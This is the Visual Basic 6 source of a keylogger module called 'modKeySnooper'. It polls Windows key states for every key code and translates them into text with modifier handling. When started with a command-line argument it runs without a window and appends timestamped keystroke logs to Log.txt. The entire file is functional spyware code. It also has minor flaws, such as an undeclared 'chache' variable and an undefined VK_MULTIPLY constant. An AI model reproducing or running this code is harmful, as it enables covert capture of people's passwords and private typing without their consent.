Attribute VB_Name = "modKeySnooper"
Public Cache As String
Dim LastSaved As Date
Dim FileName As String

Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer

Sub Main()
    If Command = "" Then
        
        frmKeySnooper.Show
    
    Else
        
        FileName = App.Path & "\" & Command
        
        KeySnooper
    
    End If
End Sub

Sub KeySnooper()
    
    Const KeyDown = -32767
    
    LastSaved = Now

Beginning:
    
    For KeyCode = 0 To 255
        If GetAsyncKeyState(KeyCode) = KeyDown Then LogKey KeyCode
        DoEvents
    Next
    
    SaveCache
    
    GoTo Beginning
    
End Sub

Private Sub SaveCache()
    
    Dim FileNum As Integer
    Dim FileName As String
    Dim Header As String
    
    If Len(Cache) = 0 Then Exit Sub
    
    If Command = "" Then
        frmKeySnooper.txtKeys.Text = Cache
        Exit Sub
    End If
    
    If DateDiff("n", LastSaved, Now()) < 5 And Len(Cache) < 1024 Then Exit Sub
    
    Header = vbCrLf & String(40, "-") & vbCrLf & Now() & vbCrLf & String(40, "-") & vbCrLf
    
    FileNum = FreeFile
    FileName = App.Path & "\Log.txt"
        
    Open FileName For Append As FileNum
    
    Print #FileNum, , Header & Cache
    
    Close FileNum
    
    Cache = ""
    LastSaved = Now()

End Sub

Private Sub LogKey(KeyCode)
    
    Dim ShiftKey As Boolean
    Dim AltKey As Boolean
    Dim CtrlKey As Boolean
    
    Dim CapsLock As Boolean
    Dim NumLock As Boolean
    Dim ScrollLock As Boolean
    
    Dim Key As String
    Dim Value As Long
    Const NumericSymbols = ")!@#$%^&*("
    
    Const VK_ADD = &H6B
    Const VK_BACK = &H8
    Const VK_DECIMAL = &H6E
    Const VK_DELETE = &H2E
    Const VK_DIVIDE = &H6F
    Const VK_DOWN = &H28
    Const VK_END = &H23
    Const VK_ESCAPE = &H1B
    Const VK_F1 = &H70
    Const VK_F24 = &H87
    Const VK_NUMPAD0 = &H60
    Const VK_NUMPAD9 = &H69
    Const VK_RETURN = &HD
    Const VK_SPACE = &H20
    Const VK_SUBTRACT = &H6D
    Const VK_TAB = &H9
    Const VK_SHIFT = &H10
    Const VK_CONTROL = &H11
    Const VK_MENU = &H12
    Const VK_CAPITAL = &H14
    
    If KeyCode = VK_SHIFT Then Exit Sub
    If KeyCode = VK_CONTROL Then Exit Sub
    If KeyCode = VK_MENU Then Exit Sub
    If KeyCode = VK_CAPITAL Then Exit Sub
    
    ShiftKey = Not GetAsyncKeyState(VK_SHIFT) = 0
    CtrlKey = Not GetAsyncKeyState(VK_CONTROL) = 0
    AltKey = Not GetAsyncKeyState(VK_MENU) = 0
    
    CapsLock = Not GetKeyState(VK_CAPITAL) = 0
    
    CapsLock = Not (ShiftKey Xor CapsLock)
    
    If KeyCode >= &H30 And KeyCode <= &H39 Then
        
        Value = KeyCode - &H30
        If CapsLock Then
            Key = Key & CStr(Value)
        Else
            Key = chache & Mid(NumericSymbols, Value + 1, 1)
        End If
        
        GoTo Finnish
    End If
      
    If KeyCode >= &H41 And KeyCode <= &H5A Then
        If CapsLock Then
            Key = Key & LCase(Chr(KeyCode))
        Else
            Key = Key & UCase(Chr(KeyCode))
        End If
        GoTo Finnish
    End If
    
    If KeyCode >= VK_NUMPAD0 And KeyCode <= VK_NUMPAD9 Then
        Key = Key & CStr(KeyCode - VK_NUMPAD0)
        GoTo Finnish
    End If
    
    If KeyCode >= VK_F1 And KeyCode <= VK_F24 Then
        Key = Key & vbCrLf & "[F" & CStr((KeyCode - VK_F1) + 1) & "]" & vbCrLf
        GoTo Finnish
    End If
    
    Select Case KeyCode
        Case VK_BACK: Key = Key & "[<-]"
        Case VK_TAB: Key = Key & vbTab
        Case VK_RETURN: Key = Key & vbCrLf
        Case VK_ESCAPE: Key = Key & vbCrLf & "[Esc]" & vbCrLf
        Case VK_SPACE: Key = Key & " "
        Case VK_DELETE: Key = Key & "[Del]"
        Case VK_MULTIPLY: Key = Key & "*"
        Case VK_ADD: Key = Key & "+"
        Case VK_SUBTRACT: Key = Key & "-"
        Case VK_DECIMAL: Key = Key & "."
        Case VK_DIVIDE: Key = Key & "/"
        Case 192: Key = Key & IIf(ShiftKey, "~", "`")
        Case 189: Key = Key & IIf(ShiftKey, "_", "-")
        Case 187: Key = Key & IIf(ShiftKey, "+", "=")
        Case 219: Key = Key & IIf(ShiftKey, "{", "[")
        Case 221: Key = Key & IIf(ShiftKey, "}", "]")
        Case 220: Key = Key & IIf(ShiftKey, "|", "\")
        Case 186: Key = Key & IIf(ShiftKey, ":", ";")
        Case 222: Key = Key & IIf(ShiftKey, """", "'")
        Case 188: Key = Key & IIf(ShiftKey, "<", ",")
        Case 190: Key = Key & IIf(ShiftKey, ">", ".")
        Case 191: Key = Key & IIf(ShiftKey, "?", "/")
        Case Else ' do nothing
    End Select
    
Finnish:
    If Key = "" Then Exit Sub
    If CtrlKey Or AltKey Then Key = "[" & Key & "]"
    If CtrlKey Then Key = "[CTRL]+" & Key
    If AltKey Then Key = "[Alt]+" & Key
    Cache = Cache & Key
End Sub
